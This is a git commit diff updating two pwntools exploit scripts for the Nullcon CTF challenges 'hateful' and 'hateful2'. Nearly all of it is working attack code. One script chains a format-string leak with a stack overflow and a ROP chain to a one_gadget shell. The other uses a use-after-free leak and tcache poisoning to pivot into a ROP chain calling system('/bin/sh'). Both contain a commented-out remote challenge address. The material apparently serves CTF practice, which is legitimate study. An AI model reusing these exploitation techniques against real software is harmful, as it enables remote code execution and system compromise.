685bf2aec6c9220af7eb7641dc28ef9fcdc2bce6
XinshengZhu <xinsheng.zhu.ny@gmail.com>
2025-07-04 18:32:50 +0800

    Update Nullcon

--- Nullcon/hateful/hateful.py
+++ Nullcon/hateful/hateful.py
@@ -1,13 +1,10 @@
 from pwn import *
 
+context.arch = 'amd64'
 context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h', '-f']
+context.terminal = ['tmux', 'splitw', '-h']
 
-CHALLENGE = "./hateful"
-p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', CHALLENGE], '''
-    file hateful
-    ni
-    ni
+p = gdb.debug('./hateful_patched', '''
     b *(send_message+111)
     b *(send_message+183)
     continue
@@ -15,32 +12,29 @@ p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', CHALLENGE], '''
 
 # p = remote('52.59.124.14', 5020)
 
-# Stage 1: Leak stack address and glibc base address
-print(p.recvuntil(b">> ").decode())
-payload = b"yay"
-p.sendline(payload)
-print(p.recvuntil(b">> ").decode())
-payload = b"%p%p%p%p%p"
-p.sendline(payload)
-print(p.recvuntil(b"email provided: ").decode())
-addrs = p.recvuntil(b"\n").decode().strip()
-stack_addr = int(addrs[0:14], 16) + 0x2190
-glibc_base_addr = int(addrs[-14:], 16) - 0x1d2a80
-print(f"stack_addr: {hex(stack_addr)}")
-print(f"glibc_base_addr: {hex(glibc_base_addr)}")
+# Stage 1: leak glibc base address and rbp value
+p.sendlineafter(b">> ", b'yay')
+p.sendlineafter(b">> ", b'%p%p%p%p%p')
+p.recvuntil(b"email provided: ")
+addrs = p.recvuntil(b"\n", drop=True)
+rbp_val = int(addrs[0:14], 16)+0x2180
+glibc_base_addr = int(addrs[-14:], 16)-0x1d2a80
+print(f"rbp value: {hex(rbp_val)}")
+print(f"glibc base address: {hex(glibc_base_addr)}")
 
-# Stage 2: Form ROP chain with one gadget and send payload
-glibc_r = ROP("libc.so.6")
+# Stage 2: ROP with one gadget
+# 0xd511f execve("/bin/sh", rbp-0x40, r13)
+# constraints:
+#   address rbp-0x38 is writable
+#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
+#   [r13] == NULL || r13 == NULL || r13 is a valid envp
+glibc_r = ROP('./libc.so.6')
 chain = [
-    glibc_r.rdi.address + glibc_base_addr,  # pop rdi; ret
-    0x0,    # NULL
-    glibc_r.r13.address + glibc_base_addr,  # pop r13; ret
-    0x0,    # NULL
-    0xd511f + glibc_base_addr  # one gadget
+    glibc_base_addr+glibc_r.rdi.address, 0,
+    glibc_base_addr+glibc_r.r13.address, 0,
+    glibc_base_addr+0xd511f
 ]
-print(p.recvuntil(b"now please provide the message!\n").decode())
-payload = b"A" * 0x3f0 + p64(stack_addr) + b"".join([p64(c) for c in chain])
-p.sendline(payload)
+p.sendlineafter(b"now please provide the message!\n", b'A'*0x3f0+p64(rbp_val)+b''.join([p64(c) for c in chain]))
 
 p.interactive()
 
--- Nullcon/hateful2/hateful2.py
+++ Nullcon/hateful2/hateful2.py
@@ -1,13 +1,10 @@
 from pwn import *
 
+context.arch = 'amd64'
 context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h', '-f']
+context.terminal = ['tmux', 'splitw', '-h']
 
-CHALLENGE = "./hateful2"
-p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', CHALLENGE], '''
-    file hateful2
-    ni
-    ni
+p = gdb.debug('./hateful2_patched', '''
     b *(main+197)
     b *(main+209)      
     b *(main+221)
@@ -17,95 +14,69 @@ p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', CHALLENGE], '''
 
 # p = remote('52.59.124.14', 5022)
 
-def add_message(index, size, text):
-    print(p.recvuntil(b">> ").decode())
-    p.send(b"1\n")
-    print(p.recvuntil(b"Message Index: ").decode())
-    p.send(str(index).encode() + b"\n")
-    print(p.recvuntil(b"Message Size: ").decode())
-    p.send(str(size).encode() + b"\n")
-    print(p.recvuntil(b">> ").decode())
-    p.send(text)
-    print(p.recvuntil(b"Message Created!\n").decode())
-    log.info(f"Adding message at index: {index} with size: {size} and text: {text}")
+def add_message(index, size, data):
+    p.sendlineafter(b">> ", b'1')
+    p.sendlineafter(b"Message Index: ", str(index).encode())
+    p.sendlineafter(b"Message Size: ", str(size).encode())
+    p.sendlineafter(b">> ", data)
 
-def edit_message(index, text):
-    print(p.recvuntil(b">> ").decode())
-    p.send(b"2\n")
-    print(p.recvuntil(b"Message Index: ").decode())
-    p.send(str(index).encode() + b"\n")
-    print(p.recvuntil(b">> ").decode())
-    p.send(text)
-    print(p.recvuntil(b"Message Updated!\n").decode())
-    log.info(f"Edting message at index: {index} with text: {text}")
+def edit_message(index, data):
+    p.sendlineafter(b">> ", b'2')
+    p.sendlineafter(b"Message Index: ", str(index).encode())
+    p.sendlineafter(b">> ", data)
 
 def view_message(index):
-    print(p.recvuntil(b">> ").decode())
-    p.send(b"3\n")
-    print(p.recvuntil(b"Message Index: ").decode())
-    p.send(str(index).encode() + b"\n")
-    print(p.recvuntil(b"Message: ").decode())
-    log.info(f"Viewing message at index: {index}")
-    return p.recvuntil(b"\n\n").strip()
+    p.sendlineafter(b">> ", b'3')
+    p.sendlineafter(b"Message Index: ", str(index).encode())
+    p.recvuntil(b"Message: ")
+    return p.recvuntil(b"\n\n", drop=True)
 
 def remove_message(index):
-    print(p.recvuntil(b">> ").decode())
-    p.send(b"4\n")
-    print(p.recvuntil(b"Message Index: ").decode())
-    p.send(str(index).encode() + b"\n")
-    print(p.recvuntil(b"Message Deleted!\n").decode())
-    log.info(f"Removing message at index: {index}")
+    p.sendlineafter(b">> ", b'4')
+    p.sendlineafter(b"Message Index: ", str(index).encode())
 
-# Stage 1: Leak glibc base address and calculate required glibc addresses
-add_message(0, 0x410+1, b"A"*0x410)
-add_message(1, 0x8+1, b"B"*0x8)
+# Stage 1: leak glibc base addres
+add_message(0, 0x410+1, b'A'*0x410)
+# avoid malloc_consolidate
+add_message(1, 0x8+1, b'B'*0x8)
 remove_message(0)
-glibc_base_addr = (u64(view_message(0)[0:6].ljust(8, b"\x00")) & ~0xfff) - 0x1d2000
-log.info(f"Leaking glibc base address: {hex(glibc_base_addr)}")
-e = ELF("libc.so.6")
-glibc_system_addr = glibc_base_addr + e.symbols.system
-glibc_binsh_addr = glibc_base_addr + next(e.search(b"/bin/sh"))
-glibc_environ_addr = glibc_base_addr + e.symbols.environ
+glibc_base_addr = (u64(view_message(0)[0:6].ljust(8, b'\x00'))&~0xfff)-0x1d2000
+log.info(f"glibc base address: {hex(glibc_base_addr)}")
 
-# Stage 2: Leak heap base address
+# Stage 2: leak heap base address
 remove_message(1)
-heap_base_addr = ((u64(view_message(1)[0:5].ljust(8, b"\x00")) << 12) ^ 0) & ~0xfff
-log.info(f"Leaking heap base address: {hex(heap_base_addr)}")
+heap_base_addr = ((u64(view_message(1)[0:5].ljust(8, b'\x00'))<<12)^0)& ~0xfff
+log.info(f"heap base address: {hex(heap_base_addr)}")
 
-# Stage 3: Prepare for the first tcache poisoning
-add_message(2, 0x410+1, b"C"*0x410)
-add_message(3, 0x8+1, b"D"*0x8)
-add_message(4, 0x8+1, b"E"*0x8)
+# Stage 3: tcache poisoning to leak stack address in environ
+glibc_e = ELF('./libc.so.6')
+add_message(2, 0x410+1, b'C'*0x410)
+add_message(3, 0x8+1, b'D'*0x8)
+add_message(4, 0x8+1, b'E'*0x8)
 remove_message(3)
 remove_message(4)
+edit_message(4, p64(((heap_base_addr+0x6e0)>>12)^(glibc_base_addr+glibc_e.sym.environ-0x10)))
+add_message(5, 0x8+1, b'F'*0x8)
+add_message(6, 0x10+1, b'G'*0x10)
+stack_addr_in_environ = u64(view_message(6)[0x10:0x10+6].ljust(8, b'\x00'))
+log.info(f"stack address in environ: {hex(stack_addr_in_environ)}")
+# get the return address of add_message
+add_message_return_addr = stack_addr_in_environ-0x140
 
-# Stage 4: Perform the first tcache poisoning to leak stack address in environ and calculate return address of create
-edit_message(4, p64(((heap_base_addr + 0x6e0) >> 12) ^ (glibc_environ_addr - 0x10)))
-add_message(5, 0x8+1, b"F"*0x8)
-add_message(6, 0x10+1, b"G"*0x10)
-stack_addr_in_environ = u64(view_message(6)[0x10:0x10+6].ljust(8, b"\x00"))
-log.info(f"Leaking stack address in environ: {hex(stack_addr_in_environ)}")
-add_message_return_addr = stack_addr_in_environ - 0x140
-
-# Stage 5: Prepare for the second tcache poisoning
-add_message(7, 0x28+1, b"H"*0x28)
-add_message(8, 0x28+1, b"I"*0x28)
+# Stage 4: tcache poisoning to ROP to pop a shell
+add_message(7, 0x28+1, b'H'*0x28)
+add_message(8, 0x28+1, b'I'*0x28)
 remove_message(7)
 remove_message(8)
-
-# Stage 6: Perform the second tcache poisoning
-edit_message(8, p64(((heap_base_addr + 0x740) >> 12) ^ (add_message_return_addr - 0x8)))
-add_message(9, 0x28+1, b"J"*0x28)
-
-# Stage 7: Form and deploy ROP chain by calling create
-r = ROP("libc.so.6")
+edit_message(8, p64(((heap_base_addr+0x740)>>12)^(add_message_return_addr-0x8)))
+add_message(9, 0x28+1, b'J'*0x28)
 chain = [
-    r.rdi.address + glibc_base_addr,
-    glibc_binsh_addr,
-    r.ret.address + glibc_base_addr,
-    glibc_system_addr
+    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
+    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
+    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
+    glibc_base_addr+glibc_e.sym.system
 ]
-add_message(10, 0x28+1, b"K"*0x8 + b"".join([p64(addr) for addr in chain]))
+add_message(10, 0x28+1, b'K'*0x8+b''.join([p64(addr) for addr in chain]))
 
 p.interactive()
 
